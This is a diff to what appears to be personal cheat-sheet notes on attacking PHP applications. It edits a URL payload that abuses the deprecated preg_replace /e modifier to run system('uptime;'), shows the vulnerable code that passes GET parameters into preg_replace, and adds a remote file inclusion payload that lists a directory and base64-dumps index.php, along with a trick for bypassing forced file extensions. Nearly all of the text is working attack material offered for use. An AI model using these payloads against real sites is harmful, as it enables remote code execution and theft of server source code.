@@ -10,7 +10,7 @@ Warning
 This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
 
 
-http://.../known/e&witch=system('uptime;')
+http://.../known/e&with=system('uptime;')
 <?php
 $in = 'Somewhere, something incredible is waiting to be known';
 echo preg_replace($_GET['replace'], $_GET['with'], $in);
@@ -31,4 +31,15 @@ echo -n bl4h== | base64 -d
 
 convert to prevent that the php interpreter convert it again in a dynamic webpage
 #####################################################################################################
+
+If RFI is possible, this command in index.php of own server will print the content
+<?phpprint_R(scandir('.'));print(base64_encode(file_get_contents('index.php')));?>
+? at end of URL will break forced extentions ( degrade to GET-Parameters)
+#####################################################################################################
+
+
+
+
+
+
 
